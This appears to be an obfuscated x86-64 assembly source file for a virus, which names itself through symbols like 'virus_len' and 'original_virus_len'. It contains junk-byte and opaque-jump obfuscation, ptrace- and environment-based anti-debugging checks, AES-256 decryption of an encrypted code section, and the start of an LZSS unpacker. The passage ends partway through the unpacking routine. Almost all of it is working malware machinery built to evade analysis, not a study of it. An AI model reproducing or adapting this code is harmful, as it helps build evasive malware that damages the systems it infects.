db 0x36, 0x2b, 0xea
..@U8VD4bidZZ9P:
    mjmp        ..@0Fvq23sttyAT
db 0x92, 0x42, 0xc0
..@0Fvq23sttyAT:
    mjmp        ..@MN9zSM3dyUjO
..@ICqUmhhIpAts:
    madd        rax, 0x20
    cmp         rax, QWORD [rsp]
    mjmp        ..@hZofzkUAd2YS
db 0x63, 0x36, 0x24
..@hZofzkUAd2YS:
    mjmp        ..@SJF1yLgFpM9N
db 0xd2, 0xdf, 0x3a
..@SJF1yLgFpM9N:
    mjmp        ..@68Ojn883JxX5
..@KFl2LevVzCRD:
    movr        rax, r1
    mxor        r1, r1
    mjmp        ..@b7QRawxSU84J
db 0xdb
..@b7QRawxSU84J:
    mjmp        ..@ZNMhHDM9HUvr
..@17KWd1XrY4vB:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    mjmp        ..@xT8JRbevcdfC
..@S2hUEJE5PE6C:
    mxor        r2, r2
    mjmp        ..@n44cbE7Fpxw5
..@OBgSyFz7o4Dq:
    movr        rbp, rbp
    movr        rbx, rdi
    mov         rsi, QWORD [rsp+1*bytes]
    mov         rcx, QWORD [rsp]
    cmp         QWORD [rsp+2*bytes], rcx
    mjmp        ..@vBIlqpsDyWdw
..@M03UsrOynljB:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        rcx, rcx
    movv        rax, SYS_PTRACE
    syscall
%endif
%endif
    mjmp        ..@ruxMpZKgaZ48
..@CoASI3Ji0blq:
    jmp         rax
    mjmp        ..@Vsxcl75EA1hN
..@JvkYodEhZJZb:
    aeskeygenassist xmm2, xmm3, 0x20
    call        ..@Oe6GNUw2otOE
    xchg        rdi, rdi
    movdqa      OWORD [rsi+0xc0], xmm1
    mjmp        ..@pcmLC8UxjgxO
db 0x18, 0xd1
..@pcmLC8UxjgxO:
    mjmp        ..@RQtTAWMuTIqE
db 0x67
..@RQtTAWMuTIqE:
    mjmp        ..@5mm9oxyIi6Tq
..@fMzOQQC36eqw:
    movdqa      OWORD [rsi+0xe0], xmm1
    ret
    mjmp        ..@nK6sWlkMfIgq
..@QVZx9eQWK7pz:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        r1, 16
    movr        r2, rax
    mxor        r3, r3
    mxor        r4, r4
%endif
%endif
    mjmp        ..@Htn63jeBV5H9
Strncmp:
    mjmp        ..@Uq47te82GFiz
..@AXmei20hxNLe:
    aesimc      xmm0,xmm1
    push        rbx
    pop         rbx
    xchg        rsp, rsp
    push        rax
    mjmp        ..@Va6niAvEYxFz
..@8yPkO8DnUve0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r3, r3
%endif
%endif
    mjmp        ..@cetrHcxGOl34
db 0xa6, 0x32, 0x33
..@cetrHcxGOl34:
    mjmp        ..@q3FQYbiv1y3I
..@JZG4K5Kto9wu:
    movdqu      xmm2, OWORD [r2+rax]
    movdqu      xmm3, OWORD [r2+rax+0x10]
    pxor        xmm0, xmm2
    mjmp        ..@X8Vb5TkO0yQI
..@OkkGXisVs5OV:
%ifndef ENABLE_DEBUGGING
    madd        rsp, 0x1000
%endif
    mjmp        ..@wp2gdU1Rnf9U
db 0xa0, 0xf0, 0xe4
..@wp2gdU1Rnf9U:
    mjmp        ..@LVPXzXadDZ4o
..@3i9pq6iDfgmP:
    pxor        xmm1, xmm3
    mjmp        ..@ICqUmhhIpAts
..@pIuzgETIe8oS:
    call        ..@rOempguO01Nl
    movdqa      OWORD [rsi+0x50], xmm3
    movr        rsi, rsi
    mjmp        ..@oFFNhGjiOKYs
GetEnv:
    mjmp        ..@jmxERzFNFLUA
..@I83VsUskPCXk:
    madd        r4, bytes
    mjmp        ..@12xsAEG5uUVF
db 0xe7, 0xc7, 0x9b
..@12xsAEG5uUVF:
    mjmp        ..@feUTQq0NxT3a
..@JGnNZ6mBTcRe:
    push        rbp
    mjmp        ..@zbBeXWKaOTBc
db 0x5f, 0x64, 0x96
..@zbBeXWKaOTBc:
    mjmp        ..@DgbGKx2EpCa8
db 0xed, 0x0e, 0xa8
..@DgbGKx2EpCa8:
    mjmp        ..@IzknV2NsTWU0
db 0x39
..@IzknV2NsTWU0:
    mjmp        ..@YIl7watW1jNi
..@gg1QaAfwIP3l:
%ifndef ENABLE_DEBUGGING
    jne         ..@Vsxcl75EA1hN
%endif
    mjmp        ..@OkkGXisVs5OV
..@jmxERzFNFLUA:
    push        r1
    call        Strlen
    movr        r3, rax
    mov         r4, m4
    mjmp        ..@daOcjBdliwYe
db 0x8b
..@daOcjBdliwYe:
    mjmp        ..@JZjueW7Mxava
..@cCNPLEIwpUUP:
    movdqu      OWORD [r1], xmm0
    movdqu      OWORD [r1+0x10], xmm1
    mjmp        ..@n0AcKHxi7ssa
db 0x00
..@n0AcKHxi7ssa:
    mjmp        ..@7N0SNQbRXxAK
..@2g4Z396yE42P:
    syscall
    mjmp        ..@lWjKSLgo5fr7
db 0x88, 0xef, 0x26
..@lWjKSLgo5fr7:
    mjmp        AntiDebugging
..@Cl5nhnlJmEKT:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r4, r4
    movv        rax, SYS_WAIT4
%endif
%endif
    mjmp        ..@Bn3wXjNtuul1
..@2OAlZquWUPSb:
    ret
    mjmp        ..@FpjtvE3FsvYU
db 0x86
..@FpjtvE3FsvYU:
    mjmp        ..@s9aCGQmJeQGI
db 0x38, 0xf1, 0xa8
..@s9aCGQmJeQGI:
    mjmp        Aes256KeyCreation
..@U5VLgzy4fVkH:
    movdqu      OWORD [rsp+0xd0],xmm0
    mjmp        ..@96IAb1hYuX6R
db 0x41
..@96IAb1hYuX6R:
    mjmp        ..@YQt7oOXDTLCB
..@xtFAvFXWoWhD:
    mxor         r3, r3
    mjmp        ..@FenVoOferC92
..@YtRm5C9GcNep:
    cmp         eax, 0x0
    mjmp        ..@Jsd9hP6hjHti
db 0x08, 0x84
..@Jsd9hP6hjHti:
    mjmp        ..@yfErrB6iNL8X
..@qt0G5qWq0P9k:
    push        rbx
    pop         rbx
    movv        rax, SYS_SETSID
    xchg        rsi, rsi
    syscall
    mjmp        ..@ZiwkVFqNor3o
db 0x00, 0x33
..@ZiwkVFqNor3o:
    mjmp        ..@rUKyVOSM5gb6
db 0x10
..@rUKyVOSM5gb6:
    mjmp        ..@Lac04jNZJo7O
..@ZM9zl0tvbAiT:
    push        rsi
    pop         rsi
    movr        rbx, rbx
    mjmp        ..@5Jje0FbAgYB0
..@EZE1ufsMik5G:
    movv        rax, SYS_EXIT
    mjmp        ..@2g4Z396yE42P
..@0Xivs3ZObfBI:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xc0],xmm0
    mjmp        ..@o6WK1jHQrdVc
..@myepWQvhBySr:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    shr         eax, 8
    madd        rsp, bytes
%endif
%endif
    mjmp        ..@6hcem7rxUcYS
db 0x03, 0x02, 0x93
..@6hcem7rxUcYS:
    mjmp        ..@jCAWQVzZG0Wn
..@dReYogRpaU0O:
    call        ..@Oe6GNUw2otOE
    mjmp        ..@pT4xre8BiQ0a
db 0x90
..@pT4xre8BiQ0a:
    mjmp        ..@0AbsUtoMniV7
..@HihmuLrCI0or:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    mjmp        ..@k80TFlqNAvQ3
db 0xdb, 0xca
..@k80TFlqNAvQ3:
    mjmp        ..@nSkMZ4YpaFjW
..@z8XwaMU5jr76:
%ifndef ENABLE_DEBUGGING
    jnz         ..@Vsxcl75EA1hN
%endif
    mjmp        ..@9JQte34YL82G
..@OnTQd9FXdPFP:
    aesdec      xmm0, xmm1
    mjmp        ..@ZCZiRSX8XCd5
..@56ibPxks5Fm3:
    movdqu      OWORD [rsp+0x40],xmm0
    movdqu      xmm1, OWORD [rsp+0x50]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x50],xmm0
    movdqu      xmm1, OWORD [rsp+0x60]
    mjmp        ..@Gy7Zuoi1glkb
..@YQt7oOXDTLCB:
    movdqu      xmm0, [rsi+rcx]
    movdqu      xmm1, OWORD [rsp+0xe0]
    mjmp        ..@v0GYV1o1Rf9D
..@UlAD8ZCdBFjh:
    push        rsi
    pop         rsi
    movr        rsp, rsp
    mjmp        ..@JvkYodEhZJZb
..@OMNmqwpAAcVi:
    msub        rsp, _AESD_OFF_size+0x100
    and         rsp, 0xfffffffffffffff0
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    mov         QWORD [rsp+_AESD_OFF.length], r2
    mjmp        ..@rcnmfzcpZiUO
db 0xd4, 0xc0
..@rcnmfzcpZiUO:
    mjmp        ..@jHtAtImPZYWT
..@Oe6GNUw2otOE:
    xchg        rcx, rcx
    pshufd      xmm2, xmm2, 0xff
    movdqa      xmm4, xmm1
    pslldq      xmm4, 0x4
    mjmp        ..@AbGnsxdGbhWw
..@8e58i0uv0sEz:
%ifndef ENABLE_DEBUGGING
    push        rsi
    pop         rsi
%endif
    mjmp        ..@27T36SQYtMxd
db 0xd7, 0xdd, 0x08
..@27T36SQYtMxd:
    mjmp        ..@erB5lhL9Uh0B
db 0x8f, 0x91
..@erB5lhL9Uh0B:
    mjmp        ..@XwQWmuqFZe7V
..@rOempguO01Nl:
    pshufd      xmm2, xmm2, 0xaa
    mjmp        ..@HZQVOKri9xfw
db 0xc7, 0xfe, 0xc6
..@HZQVOKri9xfw:
    mjmp        ..@1hofDxf4JHq8
..@HCdKRLb9TaNa:
    movdqu      xmm1, OWORD [rsp+0xa0]
    mjmp        ..@imuYbDVR5vq9
db 0x10, 0xcf, 0x58
..@imuYbDVR5vq9:
    mjmp        ..@amXbR565Pd8N
..@vBIlqpsDyWdw:
    jl          ..@3TY9O837Y9oV
    mjmp        ..@la2YfDOYtYw3
..@z2ILLOqVErgY:
    mxor        r3, r3
    mxor        r4, r4
    movv        rax, SYS_WAIT4
    syscall
    madd        rsp, bytes
    mjmp        ..@8GRID5TNru9x
..@Wu7ylAEcxU3F:
%ifndef ENABLE_DEBUGGING
    pop         rdx
    movr        r3, r5
%endif
    mjmp        ..@HwOErDXzkwBH
..@ePqFAwr9beoo:
    pxor        xmm3, xmm2
    ret
    mjmp        Aes256Decryption
Aes256KeyCreation:
    mjmp        ..@LAeg5Mc7lkqI
..@EZW4ctZxOySL:
%ifndef ENABLE_DEBUGGING
    pop         rdi
%endif
    mjmp        ..@W1zja1VKkDMp
..@q3FQYbiv1y3I:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r4, r4
%endif
%endif
    mjmp        ..@mCUytokcKX0s
db 0xfc, 0x02
..@mCUytokcKX0s:
    mjmp        ..@M03UsrOynljB
..@Z1Rljxr5dvfU:
    madd        r1, 1
    madd        r2, 1
    dec         r3
    jnz         ..@ve55yOfSEjX5
    mjmp        ..@z1tkMnP1mxYq
db 0x0c, 0xcd, 0x02
..@z1tkMnP1mxYq:
    mjmp        ..@e6eyOcnc4p1B
db 0x58, 0x59
..@e6eyOcnc4p1B:
    mjmp        ..@FMsIYEH5Fgry
..@B3j7YEiIVzP4:
    pop         rcx
    mjmp        ..@elfPFuYzQjLm
db 0xb7
..@elfPFuYzQjLm:
    mjmp        ..@oPpzbZCXNEPA
..@V5wSFNfolzU2:
    mxor        r5, r5
    mjmp        ..@B4jvuMeNCSR7
db 0xd5, 0xb3
..@B4jvuMeNCSR7:
    mjmp        ..@CoASI3Ji0blq
..@3TY9O837Y9oV:
    mxor        rbx, rbx
    mjmp        ..@L4uv6tM5je8r
db 0xd2, 0x94, 0x3d
..@L4uv6tM5je8r:
    mjmp        ..@3KNpSBWTd3a1
..@nYofpOBdFAuK:
    test        eax, eax
    jz          ..@rqV7yPPznYwa
    mjmp        ..@0Q8znHj7sL7u
..@1u5DpY9FrMIy:
    pop         rdi
    movdqa      OWORD [rsi+0x30], xmm3
    aeskeygenassist xmm2, xmm3, 0x2
    push        rsi
    mjmp        ..@uwu9K7mpCQKW
..@DFVJGoJ94VZl:
    mov         r2d, DWORD [r5]
    add         r2, r4
    msub        r2, non_encrypted_len
    movr        r5, r2
    mjmp        ..@Xq2ChXhOERWE
..@jHtAtImPZYWT:
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    movr        rsi, rsp
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    call        Aes256KeyExpansion
    mxor        rcx, rcx
    mjmp        ..@ratj3PB1NMnd
db 0x98, 0xf1
..@ratj3PB1NMnd:
    mjmp        ..@0rnZXHvN1HtY
db 0x18, 0xa3, 0x99
..@0rnZXHvN1HtY:
    mjmp        ..@p0TCKHp2XHMY
db 0x49, 0xaa
..@p0TCKHp2XHMY:
    mjmp        ..@6Pz57MnVh9FX
..@Gy7Zuoi1glkb:
    aesimc      xmm0,xmm1
    mjmp        ..@vEB2VZV7kaEf
db 0x99, 0xe7
..@vEB2VZV7kaEf:
    mjmp        ..@oCvbpPLuV3Tu
..@MAXr9uFe5Ym6:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r3, r3
%endif
%endif
    mjmp        ..@Cl5nhnlJmEKT
..@e1V1jySZnmiS:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r2, rsp
%endif
%endif
    mjmp        ..@MAXr9uFe5Ym6
..@v5x4DXZbdpml:
    DESTROY_MX_VAR
    mjmp        ..@92UQToLAOQO0
db 0x29, 0x86
..@92UQToLAOQO0:
    mjmp        ..@EZE1ufsMik5G
..@kS7jyjdiJdGy:
    sub         QWORD [rsp+2*bytes], rdx
    mjmp        ..@reWiARkBn8qh
..@W1zja1VKkDMp:
%ifndef ENABLE_DEBUGGING
    movr        rcx, rcx
    VAR         public, columns
    movr        r1, r5
    call        GetEnv
%endif
    mjmp        ..@17KWd1XrY4vB
..@XDJA3e0zbwh0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r1, rax
    push        rsi
    pop         rsi
%endif
%endif
    mjmp        ..@e1V1jySZnmiS
..@ZNMhHDM9HUvr:
    mxor        r2, r2
    mjmp        ..@lZbcRqLXjsdl
db 0x67
..@lZbcRqLXjsdl:
    mjmp        ..@EVV8QxaWzteN
db 0xb6, 0xd9
..@EVV8QxaWzteN:
    mjmp        ..@SzJ2pu999t9T
..@bjp58Ff6CAfu:
    mxor        rax, rax
    mjmp        ..@kdAP0xIJ5wzB
..@X8Vb5TkO0yQI:
    movr        rcx, rcx
    mjmp        ..@3uFlAueihYf5
db 0x3c, 0x93
..@3uFlAueihYf5:
    mjmp        ..@3i9pq6iDfgmP
..@Uo3iDXuP5nHD:
    xchg        rdx, rdx
    mjmp        ..@HVj1wlz2N2jQ
db 0x84, 0x40
..@HVj1wlz2N2jQ:
    mjmp        ..@DkMDgTsAFtrQ
..@CMEz4k5r0zoe:
    call        ..@Oe6GNUw2otOE
    movdqa      OWORD [rsi+0x60], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@rOempguO01Nl
    mjmp        ..@rcKMXMmFbg23
db 0x22, 0x3f, 0x8f
..@rcKMXMmFbg23:
    mjmp        ..@CIwqQkGCxVXd
..@yCEveI8wCU83:
%ifndef ENABLE_DEBUGGING
    pop         rax
    call        Memmem
    madd        rax, tracerline_size
    cmp         WORD [rax], 0x0a30
%endif
    mjmp        ..@gg1QaAfwIP3l
..@2KMDGedjc5F6:
    cmp         BYTE [r1 + rax], 0x0
    jz          ..@MN9zSM3dyUjO
    madd        rax, 1
    mjmp        ..@2KMDGedjc5F6
    mjmp        ..@QRobB6mqpA3q
db 0xab, 0xdf
..@QRobB6mqpA3q:
    mjmp        ..@cH92XvOYDijS
..@QoE7vRf0WIEB:
    movdqu      xmm1, OWORD [rsp+0x20]
    mjmp        ..@ZLb0dzlQupk9
db 0xa6
..@ZLb0dzlQupk9:
    mjmp        ..@uzAw2F6CoalA
db 0x10, 0xdd, 0x6e
..@uzAw2F6CoalA:
    mjmp        ..@TAXuy1E4Kvj9
..@h4gVa6N5Mag3:
    movdqu      xmm1, OWORD [rsp+0x10]
    mjmp        ..@OnTQd9FXdPFP
..@ORXQwJHvgdXc:
    mov         vsp, rdi
    movr        rdi, rbp
    push        rdi
    mjmp        ..@c1XZIfMWkCqe
db 0x94
..@c1XZIfMWkCqe:
    mjmp        ..@PHHA2pXywiDk
db 0xcd, 0xcc, 0x1c
..@PHHA2pXywiDk:
    mjmp        ..@0ByRdlovxnlo
..@XwQWmuqFZe7V:
%ifndef ENABLE_DEBUGGING
    syscall
    movr        rbx, rbx
    movv        r1, 1
    xchg        rax, rax
    call        ExitProgram
%endif
    mjmp        ..@OggLhC6npAwX
..@uwu9K7mpCQKW:
    pop         rsi
    mjmp        ..@dReYogRpaU0O
..@Ovs9eZJWSEqF:
    push        rax
    pop         rax
    mjmp        ..@PnJDWtV1tLuf
db 0xc2
..@PnJDWtV1tLuf:
    mjmp        ..@lAtLjwRugT7N
..@gok3An5a2Cem:
    movv        rcx, 0x8
    xchg        rsp, rsp
    rep         movsd
    lea         r1, [rsp+_UEC_OFF.key]
    mjmp        ..@2mv203nvrJQi
db 0xe1
..@2mv203nvrJQi:
    mjmp        ..@EykzLO2IS5XT
db 0x9a
..@EykzLO2IS5XT:
    mjmp        ..@r611pZ0rrXCU
Aes256Decryption:
    mjmp        ..@JGnNZ6mBTcRe
..@jCAWQVzZG0Wn:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
    jnz         ..@Vsxcl75EA1hN
%endif
%endif
    mjmp        ..@xuCKQOiyQysH
db 0x04
..@xuCKQOiyQysH:
    mjmp        ..@itgalRbVNFIu
..@JZjueW7Mxava:
    push        rbx
    mjmp        ..@QtYcTnS7gE7A
db 0xe1, 0xc6, 0x62
..@QtYcTnS7gE7A:
    mjmp        ..@LRNwA3tifArA
db 0x02, 0xa8
..@LRNwA3tifArA:
    mjmp        ..@bcEJDAVwuSAM
..@wp4upqWz8TpW:
    call        ..@Oe6GNUw2otOE
    movdqa      OWORD [rsi+0x80], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    push        rcx
    mjmp        ..@B3j7YEiIVzP4
..@rmITIns8zvrJ:
%ifndef ENABLE_DEBUGGING
    movr        r1, rsp
    movv        r2, 0x200
    rep         nop
%endif
    mjmp        ..@8ZPCWTySmNIb
..@wzwiPjKXPjTT:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    msub        rsp, bytes
    mov         QWORD [rsp], 0x00
    movr        rbp, rbp
    xchg        rsi, rsi
%endif
%endif
    mjmp        ..@XDJA3e0zbwh0
..@0ByRdlovxnlo:
    push        rbx
    push        rdi
    pop         rdi
    pop         rbx
    pop         rdi
    mjmp        ..@JumzEHjR7NOL
db 0x3a
..@JumzEHjR7NOL:
    mjmp        ..@nJPvKESGABUu
db 0x94
..@nJPvKESGABUu:
    mjmp        ..@9Z7vYLAFkFa8
db 0xed
..@9Z7vYLAFkFa8:
    mjmp        ..@Pb4COLXkk29e
..@1MOfwvfr6xau:
    jz          ..@3KNpSBWTd3a1
    mov         rdx, QWORD [rsp]
    sub         rdx, rcx
    push        rsi
    pop         rsi
    mjmp        ..@A74Mv6Zy1a4z
db 0x02, 0xe8
..@A74Mv6Zy1a4z:
    mjmp        ..@AaVNQoewXjgH
db 0x00, 0x6b
..@AaVNQoewXjgH:
    mjmp        ..@kS7jyjdiJdGy
..@nHbLXIsjFr32:
    jne         ..@HhYjL8migDI0
    movr        rcx, rcx
    GGLOBAL     _packed
    mov         m8, r5 
    mjmp        ..@QezcYLsVRCA0
db 0xdf, 0xe7, 0xe0
..@QezcYLsVRCA0:
    mjmp        ..@2w2vXqiOTea5
..@AbGnsxdGbhWw:
    pxor        xmm1, xmm4
    mjmp        ..@CSx0MLDeuT28
..@reWiARkBn8qh:
    mjmp        ..@OBgSyFz7o4Dq
    mjmp        ..@3TY9O837Y9oV
..@SJE26YgyGOFf:
    pop         rcx
    mjmp        ..@UuOiz7Cu1x0J
db 0xcc, 0x1f, 0x0c
..@UuOiz7Cu1x0J:
    mjmp        ..@pEW7EAAQcCJ6
db 0x4e, 0xf4
..@pEW7EAAQcCJ6:
    mjmp        ..@njJTjOfdPabh
db 0xf0
..@njJTjOfdPabh:
    mjmp        ..@X5eXLF9AuO2v
..@1wPfh8FTKA47:
    movdqu      OWORD [rsp+0x90],xmm0
    mjmp        ..@XP21RVvPheR7
..@PQIAHOwn7uou:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
    rep         nop
    movv        r1, 17
    movr        r2, rax
%endif
%endif
    mjmp        ..@8yPkO8DnUve0
..@ptYMD7yGuiQg:
    aeskeygenassist xmm2, xmm3, 0x40
    movr        rdi, rdi
    call        ..@Oe6GNUw2otOE
    mjmp        ..@uOJr5xmS4AVT
db 0xe1, 0x3a, 0xcf
..@uOJr5xmS4AVT:
    mjmp        ..@fMzOQQC36eqw
..@iPIIsxcGT9Ea:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_GETPPID
    syscall
    movr        r1, rax
    mxor        r2, r2
    mxor        r3, r3
%endif
%endif
    mjmp        ..@GNdtej4fiEPe
db 0x5e
..@GNdtej4fiEPe:
    mjmp        ..@oe46jt41nr7o
..@Fpr2Lna9QGmM:
    mxor        rax, rax
    xchg        rbx, rbx
    push        rsi
    pop         rsi
    xchg        rsp, rsp
    mjmp        ..@2KMDGedjc5F6
..@N7j7Vzizrnyc:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    mjmp        ..@yCEveI8wCU83
..@Bn3wXjNtuul1:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        rbx, rbx
    syscall
    pop         rax
    and         rax, 0xff00
%endif
%endif
    mjmp        ..@2zKNU9PWEQa2
db 0x3b, 0xe5, 0x3b
..@2zKNU9PWEQa2:
    mjmp        ..@myepWQvhBySr
..@Yjy1mFAVcSlT:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_WAIT4
%endif
%endif
    mjmp        ..@h2cO4F6Hfi5z
db 0x5d, 0x46
..@h2cO4F6Hfi5z:
    mjmp        ..@POjqVxRHaVOJ
..@ZtPeeb2c4NQ0:
    movdqa      OWORD [rsi], xmm1
    movdqa      OWORD [rsi+0x10], xmm3
    mjmp        ..@0OIx4NqvycgU
db 0x6f
..@0OIx4NqvycgU:
    mjmp        ..@Ca3KjYrIcnMd
..@shniqkupqRjR:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        rax, rax
%endif
%endif
    mjmp        ..@Xr21434qrOqb
db 0x33, 0x9b, 0x45
..@Xr21434qrOqb:
    mjmp        ..@374OF6e5lSnc
..@CIwqQkGCxVXd:
    movdqa      OWORD [rsi+0x70], xmm3
    push        rsi
    pop         rsi
    mjmp        ..@2S3celUFBkVD
db 0xc2, 0xf2, 0x29
..@2S3celUFBkVD:
    mjmp        ..@ijL2TYd7bepX
db 0x8b
..@ijL2TYd7bepX:
    mjmp        ..@lGJ7brzlBEkD
..@D00L1hiQ1rWJ:
%ifndef ENABLE_DEBUGGING
    VAR         public, debugging
    xchg        rsi, rsi
    movr        r2, r5
%endif
    mjmp        ..@TfouvkaDy1Wl
..@nK6sWlkMfIgq:
    xchg        rdi, rdi
    mjmp        ..@Oe6GNUw2otOE
..@FenVoOferC92:
    mxor         r4, r4
    mjmp        ..@XUmxrkJ0joAQ
db 0x2c
..@XUmxrkJ0joAQ:
    mjmp        ..@mtG0i0HdtWlo
..@Lac04jNZJo7O:
    mxor        rax, rax
    movv        rax, SYS_FORK
    syscall
    mjmp        ..@KXGnl69ZvCNA
db 0x59, 0xf3
..@KXGnl69ZvCNA:
    mjmp        ..@nYofpOBdFAuK
..@Vsxcl75EA1hN:
%ifndef ENABLE_DEBUGGING
    mxor        rax, rax
%endif
    mjmp        ..@qXDSuQC1EXkS
db 0xa3, 0xe2
..@qXDSuQC1EXkS:
    mjmp        ..@KEQKp98K26wl
..@PaTZJCL4SuQz:
    mxor        r1, r1
    mjmp        ..@oETaQbegYAxo
db 0xa8
..@oETaQbegYAxo:
    mjmp        ..@CGgR5iR7eR09
..@yLPppBcYSt5F:
%ifndef ENABLE_DEBUGGING
    movr        r5, rax
    RFILE       rax, [rsp], 0x200
    cmp         eax, 0x200
    jne         ..@ruxMpZKgaZ48
    CFILE       r5d
%endif
    mjmp        ..@rmITIns8zvrJ
..@PgXge4hcZOXS:
    pop         rdx
    push        rdx
    mjmp        ..@Qg5T5P2ztMRW
db 0x49, 0x62, 0x28
..@Qg5T5P2ztMRW:
    mjmp        ..@P4q1izHW4no5
..@Ca3KjYrIcnMd:
    aeskeygenassist xmm2, xmm3, 0x1
    call        ..@Oe6GNUw2otOE
    mjmp        ..@XF7yIGhHtm9H
db 0x3d, 0x2f
..@XF7yIGhHtm9H:
    mjmp        ..@tiiHR9s00Gde
..@3KNpSBWTd3a1:
    movr        rax, rbx
    madd        rsp, 4*bytes
    ret
    rep         nop
    mjmp        Strncmp
..@CGgR5iR7eR09:
    call        ExitProgram
    mjmp        ..@HhYjL8migDI0
..@zJAnE4qLwoQR:
    lea         r3, [rsp+_UEC_OFF.key]
    mjmp        ..@6NBmCIRQG9Qb
db 0xf0, 0x27, 0xd7
..@6NBmCIRQG9Qb:
    mjmp        ..@haMcQmlaNy7D
..@Q8M5nmDvJxX1:
    movdqu      OWORD [rsp+0xb0],xmm0
    push        rdi
    pop         rdi
    movdqu      xmm1, OWORD [rsp+0xc0]
    mjmp        ..@0Xivs3ZObfBI
..@z9VfdN2eNicu:
    pop         rdx
    test        rax, rax
    jz          ..@zgXw7aWvdl5P
    push        rdi
    pop         rdi
    mjmp        ..@I83VsUskPCXk
..@9cEZqJjbLlEx:
    and         r2, 0xfffffffffffffff0
    mjmp        ..@zJAnE4qLwoQR
..@4gQV0beL4HiH:
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xc0]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xb0]
    mjmp        ..@dAY8ExyVpUq8
db 0xaf
..@dAY8ExyVpUq8:
    mjmp        ..@iAzE61Qz1fYV
..@54fGfByMSpWK:
    movdqu      xmm1, OWORD [rsp+0x10]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x10],xmm0
    movr        rax, rax
    mjmp        ..@UOOpcUjw3235
db 0x85, 0x0d
..@UOOpcUjw3235:
    mjmp        ..@QoE7vRf0WIEB

;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .length     resq 0x1
    .index      resd 0x1
    .bits_buf   resb 0x1
    .mask       resb 0x1
    .bits       resq 0x1
endstruc
;-----------------------------------------------------
; Encrypted Proprocessor values.
original_virus_len: equ _eof-_start
;-----------------------------------------------------
; Encrypted code.
;-----------------------------------------------------
UnpackExecutableCode:
    jmp         ..@UDfCu2YPYR2Y
..@8PY9J67reOxH:
    GGLOBAL     virus_len
    je          ..@Ako4zs8nSyuX
    jne         ..@Ako4zs8nSyuX
..@Nki2VmVna5KC:
    push        rdx
    js          ..@Zc2OSBIzT94U
    jns         ..@Zc2OSBIzT94U
..@8Nz1uIref91e:
    mov         QWORD [rsp+_LZSSD_OFF.outputaddr], r3
    jmp         ..@3EwK5z443ouA
..@ZKtx5TQq5vcT:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    mov         rax, 0x20
    rep         stosb
    push        rdi
    jb          ..@KYDxNKkSilCQ
    jae         ..@KYDxNKkSilCQ
..@dNzdtKVnzoMA:
    mov         rbp, rbp
    jmp         $+3
db 0x03
    js          ..@MovKenmOOJQS
    jns         ..@MovKenmOOJQS
..@eoIkEQ77UW0O:
    xor         rdi, rdi
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0xaf
    jmp         ..@LtusltNgZ2Vb
..@3EwK5z443ouA:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jmp         ..@LIuM8JKHeJGY
..@TDOlCuQ2smaA:
    rep         nop
    jb          ..@jZfahwNRWsIE
    jae         ..@jZfahwNRWsIE
..@Z6AEFBqHQlbT:
    mov         rcx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         ..@7Q2jkHFHNPWc
..@XIr636dLaNpc:
    pop         rcx
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
    jb          ..@Nki2VmVna5KC
    jae         ..@Nki2VmVna5KC
..@ZROAVvm5KTkP:
    shl         eax, 1
    jmp         $+3
db 0x38
    js          ..@thKbDYSkyqsT
    jns         ..@thKbDYSkyqsT
..@Ev8mxbLhAArZ:
    mov         rbx, rbx
    jmp         $+5
db 0xa6, 0x13, 0x28
    jb          ..@qzOXKx1XsAHn
    jae         ..@qzOXKx1XsAHn
..@qVuM6mKtvG8C:
    xor         rax, rax
    xor         rcx, rcx
    xor         rdi, rdi
    jmp         $+4
db 0x38, 0x5f
    jl          ..@FrfuOvcWVi19
    jge         ..@FrfuOvcWVi19
..@OJGgs1LqBrPN:
    ret
..@5hqzoZj7Gqwm:
    mov         rcx, 8
    jb          ..@KUmT40x7hl6V
    jae         ..@KUmT40x7hl6V
